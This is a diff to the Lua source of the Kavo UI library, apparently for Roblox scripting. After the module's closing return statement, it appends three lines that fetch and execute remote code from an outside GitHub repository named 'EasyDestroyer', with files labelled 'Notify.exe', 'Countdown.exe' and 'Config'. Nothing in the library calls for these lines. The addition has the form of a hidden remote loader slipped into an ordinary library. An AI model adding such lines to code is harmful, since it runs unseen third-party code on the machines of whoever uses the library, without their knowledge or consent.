@@ -2643,3 +2643,7 @@ function Kavo.CreateLib(kavName, themeList)
     return Tabs
 end
 return Kavo
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyDestroyer/EasyDestroyer.gg/main/Notify.exe"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyDestroyer/EasyDestroyer.gg/main/Countdown.exe"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EasyDestroyer/EasyDestroyer.gg/main/Config"))()
